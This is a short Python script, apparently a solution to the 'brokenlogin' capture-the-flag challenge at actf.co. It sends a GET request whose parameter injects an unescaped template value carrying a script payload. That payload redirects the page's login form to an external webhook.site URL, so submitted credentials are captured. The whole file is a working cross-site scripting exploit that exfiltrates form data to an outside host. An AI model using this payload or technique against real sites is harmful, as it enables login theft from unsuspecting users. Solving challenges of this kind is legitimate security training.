import requests
import urllib.parse


payload = "<script>window.onload = (() => {document.forms[0].action='https://webhook.site/f571aae8-deda-4a42-84ba-6a77b106aab1';})</script>"


p = requests.get("https://brokenlogin.web.actf.co/?message=%7B%7Brequest.args.a%7Csafe%7D%7D&a="+urllib.parse.quote(payload))

print(p.url)
print(p.text)